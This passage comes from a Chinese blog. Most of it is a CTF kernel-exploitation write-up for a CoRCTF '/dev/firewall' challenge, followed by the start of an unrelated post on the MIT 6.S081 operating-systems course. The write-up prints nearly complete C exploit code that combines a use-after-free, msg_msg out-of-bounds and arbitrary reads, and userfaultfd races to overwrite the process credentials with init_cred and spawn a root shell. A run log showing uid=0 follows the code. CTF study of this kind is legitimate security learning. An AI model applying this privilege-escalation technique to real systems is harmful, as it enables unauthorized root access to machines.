class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">(<span class="keyword">uint64_t</span> fault_page, <span class="keyword">uint64_t</span> fault_page_len, <span class="keyword">void</span> *(*func)(<span class="keyword">void</span> *), <span class="keyword">pthread_t</span> *thr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">  <span class="comment">// pthread_t thr;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">  ua.api = UFFD_API;</span><br><span class="line">  ua.features = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">  ur.range.len   = fault_page_len;</span><br><span class="line">  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">  <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);  </span><br><span class="line">  <span class="keyword">int</span> s = pthread_create(thr, <span class="literal">NULL</span>, func, (<span class="keyword">void</span>*)uffd); </span><br><span class="line">  <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// handler1(): put forged data on (page_1+0x1000), QID #2&#x27;s msg.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_msg</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_msg created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1)) <span class="comment">// 从uffd读取msg结构，虽然没用</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page1 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] page fault 1 at page1+0x1000\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];  <span class="comment">// 预先设置好buffer内容，往缺页处进行拷贝</span></span><br><span class="line">      <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      msg_header fake_msg_header;</span><br><span class="line">      fake_msg_header.m_type = <span class="number">1</span>;</span><br><span class="line">      fake_msg_header.m_ts   = <span class="number">0x1000</span>;</span><br><span class="line">      fake_msg_header.next   = current_task+<span class="number">0x538</span><span class="number">-0x8</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(buffer+<span class="number">0xfd0</span><span class="number">-0x8</span>, (<span class="keyword">void</span> *)&amp;fake_msg_header, <span class="keyword">sizeof</span>(msg_header));  <span class="comment">// msg_msgseg.next - 8 bytes (we should skip this 8 bytes)</span></span><br><span class="line">    <span class="comment">//   memset(buffer,0x61,0x2000);</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page1+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">//   printf(&quot;asdf\n&quot;);</span></span><br><span class="line">          <span class="keyword">if</span> (is_write_msg)</span><br><span class="line">          &#123;</span><br><span class="line">              ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;write msg ok\n&quot;</span>);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler_write_task</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg1</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] handler_write_task created&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="keyword">int</span> nready;</span><br><span class="line">  pollfd.fd      = uffd;</span><br><span class="line">  pollfd.events  = POLLIN;</span><br><span class="line">  nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (nready != <span class="number">1</span>)  <span class="comment">// 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Wrong pool return value&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read(uffd, &amp;msg1, <span class="keyword">sizeof</span>(msg1)) != <span class="keyword">sizeof</span>(msg1))  <span class="comment">// 从uffd读取msg结构，虽然没用</span></span><br><span class="line">    err_exit(<span class="string">&quot;[-] Error in reading uffd_msg&quot;</span>);</span><br><span class="line">  assert(msg1.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (msg1.arg.pagefault.address == (page2 + page_size))</span><br><span class="line">  &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+] page fault 2 at page2+0x1000\n&quot;</span>);</span><br><span class="line">      is_write_msg = <span class="number">1</span>;                                <span class="comment">// wait for page fault 1</span></span><br><span class="line">      sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//   pthread_join(td[0],NULL);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[*] msg next write is ok\n&quot;</span>);</span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">0x2000</span>]; </span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>)=init_cred;</span><br><span class="line">      *(<span class="keyword">size_t</span> *)(buffer+<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">8</span>)=init_cred;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">      uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buffer;</span><br><span class="line">      uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page2+page_size; <span class="comment">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1);</span></span><br><span class="line">      uc.len = <span class="number">0x1000</span>;</span><br><span class="line">      uc.mode = <span class="number">0</span>;</span><br><span class="line">      uc.copy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      ioctl(uffd, UFFDIO_COPY, &amp;uc); <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write task ok\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;33m debug\e[0m\n&quot;</span>);</span><br><span class="line">    add_rule(fd,<span class="number">3</span>,INBOUND);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_current_task</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    <span class="keyword">char</span> re_buf[<span class="number">0x2000</span>];</span><br><span class="line">    current_task=init_task;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    </span><br><span class="line">    fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">    prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        current_task=prev_task;</span><br><span class="line">        fake_msg_header.next=current_task+<span class="number">0x290</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        pid=*(<span class="keyword">int</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x100</span>);</span><br><span class="line">        prev_task=*(<span class="keyword">size_t</span> *)(re_buf+(<span class="number">0x1000</span><span class="number">-0x30</span>)+<span class="number">0x8</span>+<span class="number">0x8</span>)<span class="number">-0x298</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m pid:%d  getpid:%d \e[0m\n&quot;</span>,pid,getpid());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg_next</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page1+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page1+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x2000</span><span class="number">-0x8</span><span class="number">-0x30</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_page_msg</span><span class="params">()</span></span>&#123;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(page2+<span class="number">0x1000</span><span class="number">-0x8</span>)=<span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get_page_msg\n&quot;</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">2</span>],page2+<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="number">0x1000</span><span class="number">-0x30</span>+<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page1=(<span class="keyword">char</span> *)mmap(<span class="number">0x200000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    page2=(<span class="keyword">char</span> *)mmap(<span class="number">0x300000</span>,<span class="number">0x3000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>((!page1)||(!page2))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    register_userfault(page1+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_msg,&amp;td[<span class="number">0</span>]);</span><br><span class="line">    register_userfault(page2+<span class="number">0x1000</span>,<span class="number">0x1000</span>,handler_write_task,&amp;td[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x2000</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x2000</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(re_buf[i])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] %p\n&quot;</span>,re_buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_current_task();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m current_task_addr:%p \e[0m\n&quot;</span>,current_task);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.先釋放4K的msg</span></span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1fc8</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.然後再把他們申請回來,並且通過userfault卡住</span></span><br><span class="line">    </span><br><span class="line">    pthread_create(&amp;td[<span class="number">2</span>],<span class="literal">NULL</span>,get_page_msg_next,<span class="literal">NULL</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//3.然後再把msg的段通過我們控制的msg給釋放掉</span></span><br><span class="line">    fake_msg_header.ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header.next=page_msg;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x10</span>,<span class="number">0</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="comment">//4.然後再把釋放掉的msg的段申請回來，這次他是msg了,並且再次通過userfault卡住</span></span><br><span class="line">    pthread_create(&amp;td[<span class="number">3</span>],<span class="literal">NULL</span>,get_page_msg,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">0</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">1</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">2</span>],<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(td[<span class="number">3</span>],<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有概率成功，主要是越界读的slab的内容不可控，可能能读到可能读不到，应该和slab的freelist的随机化有关。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/$ /myexp</span><br><span class="line"> msg_queue_addr:0xffffa041855bf6c0 </span><br><span class="line"> page_msg_addr:0xffffa041855c1000 </span><br><span class="line"> kernelbase_addr:0xffffffff9ea00000 </span><br><span class="line"> init_task_addr:0xffffffff9f6124c0 </span><br><span class="line"> init_cred_addr:0xffffffff9f633060 </span><br><span class="line"> pid:0  getpid:86 </span><br><span class="line"> pid:86  getpid:86 </span><br><span class="line"> current_task_addr:0xffffa04186128ac0 </span><br><span class="line">[+] handler_write_task created</span><br><span class="line">[+] handler_write_msg created</span><br><span class="line">[*] page fault 1 at page1+0x1000</span><br><span class="line">get_page_msg</span><br><span class="line">[+] page fault 2 at page2+0x1000</span><br><span class="line">write msg ok</span><br><span class="line">[*] msg next write is ok</span><br><span class="line">write task ok</span><br><span class="line"> debug</span><br><span class="line">uid:0</span><br><span class="line">root@CoRCTF:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用msg进行越界读和任意读还是很好用的，但注意得开启<code>MSG_COPY</code>,但是通过msg进行任意写还得配合<code>userfault</code>,但在高版本中只有root用户才能使用<code>userfault</code>，所以感觉利用msg进行任意读在真实场景中不好实现的。</p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>在本题的利用中，除了uaf以外还提供了写接口，我在想是否继续压缩条件，不使用这个写接口，而是通过把这个uaf转化成一个doublefree然后使用一个通解完成利用，我在其他博客中见到过类似思路，感觉是可行的，试试看。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/17/mit6-081%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E5%8F%8A%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">mit6.081操作系统课程及实验</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-10-17 23:45:13" itemprop="dateCreated datePublished" datetime="2022-10-17T23:45:13+08:00">2022-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-25 01:14:03" itemprop="dateModified" datetime="2022-10-25T01:14:03+08:00">2022-10-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="mit6-s081"><a href="#mit6-s081" class="headerlink" title="mit6.s081"></a>mit6.s081</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习了一段时间的kernelpwn后，发现自己对于操作系统理解的还是十分浅薄，遂想浅浅深入学习一下，然后从a3大佬得知mit的操作系统课程十分之好便下定决心跟着过一遍，本来是想学习mit6.828的，但不管教材还是视频全是洋文，而我的洋文能力着实有限，幸好我找见了mit6.s081版，也在网上找见了翻译版，还有诸多博客可以答疑，感觉可行，那就开干！</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>课程使用的是git进行代码管理和版本控制的，可笑我到目前为止只熟悉<code>git close</code>,所以再开始之前得了解一下git的命令。</p>
<p>看了几个小时，大概能使用了。</p>
<h3 id="RSIC-V指令集"><a href="#RSIC-V指令集" class="headerlink" title="RSIC-V指令集"></a>RSIC-V指令集</h3><p>……此处省略好多字</p>
